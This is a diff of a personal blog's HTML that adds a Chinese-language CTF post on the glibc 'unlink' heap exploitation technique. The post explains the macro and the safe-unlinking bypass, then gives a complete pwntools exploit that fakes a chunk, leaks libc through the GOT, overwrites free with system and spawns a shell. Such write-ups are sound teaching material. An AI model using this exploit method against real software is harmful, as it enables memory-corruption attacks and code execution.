@@ -20,16 +20,20 @@
     var CONFIG = {"hostname":"masco-joy.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Masco&#39;s blog">
-<meta property="og:url" content="https://masco-joy.github.io/tags/pwn/index.html">
+  <meta name="description" content="unlink">
+<meta property="og:type" content="article">
+<meta property="og:title" content="unlink">
+<meta property="og:url" content="https://masco-joy.github.io/2024/09/11/unlink/index.html">
 <meta property="og:site_name" content="Masco&#39;s blog">
+<meta property="og:description" content="unlink">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-09-11T13:27:36.000Z">
+<meta property="article:modified_time" content="2024-09-11T13:50:50.108Z">
 <meta property="article:author" content="Masco">
-<meta property="article:tag" content="PWN CTF">
+<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="https://masco-joy.github.io/tags/pwn/">
+<link rel="canonical" href="https://masco-joy.github.io/2024/09/11/unlink/">
 
 
 <script id="page-configurations">
@@ -37,12 +41,12 @@
   CONFIG.page = {
     sidebar: "",
     isHome : false,
-    isPost : false,
+    isPost : true,
     lang   : 'en'
   };
 </script>
 
-  <title>Tag: pwn | Masco's blog</title>
+  <title>unlink | Masco's blog</title>
   
 
 
@@ -169,171 +173,273 @@
         <div class="content-wrap">
           
 
-          <div class="content tag">
+          <div class="content post posts-expand">
             
 
+    
   
   
-  
-  <div class="post-block">
-    <div class="posts-collapse">
-      <div class="collection-title">
-        <h2 class="collection-header">pwn
-          <small>Tag</small>
-        </h2>
-      </div>
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://masco-joy.github.io/2024/09/11/unlink/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/images/background4.jpg">
+      <meta itemprop="name" content="Masco">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Masco's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          unlink
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2024-09-11 21:27:36 / Modified: 21:50:50" itemprop="dateCreated datePublished" datetime="2024-09-11T21:27:36+08:00">2024-09-11</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>2.9k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>5 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-    <div class="collection-year">
-      <span class="collection-header">2024</span>
+        <h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><span id="more"></span>
+<h2 id="unlink的定义与行为"><a href="#unlink的定义与行为" class="headerlink" title="unlink的定义与行为"></a>unlink的定义与行为</h2><h3 id="1、定义"><a href="#1、定义" class="headerlink" title="1、定义"></a>1、定义</h3><p>unlink是一个宏定义，其主要利用的代码段是   </p>
+<pre><code>#define unlink(AV, P, BK, FD) &#123;                                            
+    FD = P-&gt;fd;								      
+    BK = P-&gt;bk;								      
+    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      
+    malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  
+    else &#123;								      
+        FD-&gt;bk = BK;							      
+        BK-&gt;fd = FD;							      
+        if (!in_smallbin_range (P-&gt;size)				      
+            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;		      
+        if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)	      
+        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    
+        malloc_printerr (check_action,				      
+                &quot;corrupted double-linked list (not small)&quot;,    
+                P, AV);					      
+            if (FD-&gt;fd_nextsize == NULL) &#123;				      
+                if (P-&gt;fd_nextsize == P)				      
+                FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      
+                else &#123;							      
+                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      
+                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      
+                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      
+                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      
+                &#125;							      
+            &#125; else &#123;							      
+                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      
+                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      
+            &#125;								      
+        &#125;								      
+    &#125;									      
+&#125;    
+</code></pre>
+<p>如上</p>
+<h3 id="2、行为"><a href="#2、行为" class="headerlink" title="2、行为"></a>2、行为</h3><p>unlink的行为顾名思义，是进行的脱链的操作。<br>将一个free状态的chunk，从双向链表中脱离出来。<br><br></p>
+<h2 id="unlink漏洞"><a href="#unlink漏洞" class="headerlink" title="unlink漏洞"></a>unlink漏洞</h2><p>由于脱链后我们控制内存块会发生改变，被unlink的内存块会被移除。<br>所以如果我们可以控制这个被unlink的chunk，改变其fd与bk那我们就可以控制任意的内存块。<br>但是由于在后续glibc中增添了新的保护，所以导致其利用受限</p>
+<pre><code>FD-&gt;bk==ptr;
+BK-&gt;fd==ptr;
+       
+</code></pre>
+<p>新增了这两条，绕过的方法也有</p>
+<pre><code>FD-&gt;bk=ptr-0x18
+BK-&gt;fd=ptr-0x10
+</code></pre>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="unlink-1"><a href="#unlink-1" class="headerlink" title="unlink"></a>unlink</h3><p>EXP</p>
+<pre><code>#!/usr/bin/python3
+from pwn import *
+from LibcSearcher import *
+from ctypes import *
+import os
+
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+#ontext(os=&quot;linux&quot;, arch=&quot;i386&quot;, log_level=&quot;debug&quot;)
+
+#context.terminal = [&quot;xfce4-terminal&quot;, &quot;-e&quot;]
+
+p=process(&quot;./link&quot;)
+#p= remote(&#39;node4.anna.nssctf.cn&#39;,28277)
+libc = ELF(&quot;libc.so.6&quot;)
+elf = ELF(&quot;./link&quot;)
+
+def op():
+    gdb.attach(p)
+    pause()
+
+def inter():
+    p.interactive()
+
+def sa(content,payload):
+    p.sendafter(content,payload)
+
+def sla(content,payload):
+    p.sendlineafter(content,payload)
+
+def uc64():
+    u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8,b&quot;\\x00&quot;))
+
+def uc32():
+    u32(p.recvuntil(b&quot;\\xf7&quot;)[-4:].ljust(4,b&quot;\\x00&quot;))
+
+def exec_fmt(pad):
+    p = process(&quot;./fmt&quot;)
+    p.send(pad)
+    return p.recv()
+def rc(content):
+    p.recvuntil(content)
+
+def l(choose):
+sla(&quot;chooice :&quot;,str(choose))
+
+def add(size):
+l(1)
+sla(&quot;size&quot;,str(size))
+
+def free(index):
+l(2)
+sla(&quot;delete&quot;,str(index))
+
+def show(index):
+l(3)
+sla(&quot;show&quot;,str(index))
+
+def edit(index,content):
+l(4)
+sla(&quot;modify&quot;,str(index))
+sa(&quot;content&quot;,content)
+
+add(0x50)
+add(0x40)
+add(0x90)
+add(0x10)
+
+tar=0x6020C8
+fd=tar-0x18
+bk=tar-0x10
+
+payload=p64(0)+p64(0x41)+p64(fd)+p64(bk)+p64(0)*0x4+p64(0x40)+p64(0xa0)          //伪造被unlink的chunk，并逃逸检查
+edit(1,payload)
+free(2) //触发unlink宏
+
+
+
+payload=b&#39;a&#39;*0x10+p64(elf.got[&#39;free&#39;])
+edit(1,payload)
+show(0)
+free_got=u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&#39;\x00&#39;))
+base=free_got-libc.sym[&#39;free&#39;]
+sys=base+libc.sym[&#39;system&#39;]
+print(&quot;base=&quot;,hex(base))
+edit(0,p64(sys))
+edit(3,b&#39;/bin/sh\x00&#39;)
+free(3)
+inter()
+</code></pre>
+
     </div>
 
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+    
+    
+    <script src="//sdk.jinrishici.com/v2/browser/jinrishici.js"></script>
+<script>
+  jinrishici.load((result) => {
+    let jrsc = document.getElementById('jrsc');
+    const data = result.data;
+    let author = data.origin.author;
+    let title = '《' + data.origin.title + '》';
+    let content = data.content.substr(0, data.content.length - 1);
+    let dynasty = data.origin.dynasty.substr(0, data.origin.dynasty.length - 1);
+    jrsc.innerText = content + ' @ ' + dynasty + '·' + author + title;
+  });
+</script>
+<div style="text-align: center"><span id="jrsc" >正在加载今日诗词....</span></div>
 
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2024-09-11T21:27:36+08:00"
-              content="2024-09-11">
-          09-11
-        </time>
-      </div>
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    Donate
+  </button>
+  <div id="qr" style="display: none;">
 
-      <div class="post-title">
-          <a class="post-title-link" href="/2024/09/11/unlink/" itemprop="url">
-            <span itemprop="name">unlink</span>
-          </a>
-      </div>
+  </div>
+</div>
 
-    </header>
-  </article>
+        
 
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Masco
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://masco-joy.github.io/2024/09/11/unlink/" title="unlink">https://masco-joy.github.io/2024/09/11/unlink/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
 
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2024-08-10T11:32:08+08:00"
-              content="2024-08-10">
-          08-10
-        </time>
-      </div>
 
-      <div class="post-title">
-          <a class="post-title-link" href="/2024/08/10/orw%E6%A8%A1%E6%9D%BF/" itemprop="url">
-            <span itemprop="name">orw</span>
-          </a>
-      </div>
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
 
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2024-07-25T09:09:09+08:00"
-              content="2024-07-25">
-          07-25
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2024/07/25/house%20of/" itemprop="url">
-            <span itemprop="name">house of模板</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2024-07-20T16:59:43+08:00"
-              content="2024-07-20">
-          07-20
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2024/07/20/Fmt/" itemprop="url">
-            <span itemprop="name">format利用</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2024-07-19T21:05:10+08:00"
-              content="2024-07-19">
-          07-19
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2024/07/19/IO_2_1_stdout/" itemprop="url">
-            <span itemprop="name">_IO_2_1_stdout_</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2024-07-18T21:30:33+08:00"
-              content="2024-07-18">
-          07-18
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2024/07/18/bin/" itemprop="url">
-            <span itemprop="name">bin</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2024-07-18T20:41:15+08:00"
-              content="2024-07-18">
-          07-18
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2024/07/18/IO/" itemprop="url">
-            <span itemprop="name">IO</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
+        
+  <div class="post-widgets">
+    <div class="wp_rating">
+      <div id="wpac-rating"></div>
     </div>
   </div>
-  
-  
-  
 
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/08/10/orw%E6%A8%A1%E6%9D%BF/" rel="prev" title="orw">
+      <i class="fa fa-chevron-left"></i> orw
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
   
 
 
@@ -386,6 +492,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#unlink"><span class="nav-number">1.</span> <span class="nav-text">unlink</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#unlink%E7%9A%84%E5%AE%9A%E4%B9%89%E4%B8%8E%E8%A1%8C%E4%B8%BA"><span class="nav-number">1.1.</span> <span class="nav-text">unlink的定义与行为</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E5%AE%9A%E4%B9%89"><span class="nav-number">1.1.1.</span> <span class="nav-text">1、定义</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E8%A1%8C%E4%B8%BA"><span class="nav-number">1.1.2.</span> <span class="nav-text">2、行为</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unlink%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.2.</span> <span class="nav-text">unlink漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-number">1.3.</span> <span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#unlink-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">unlink</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
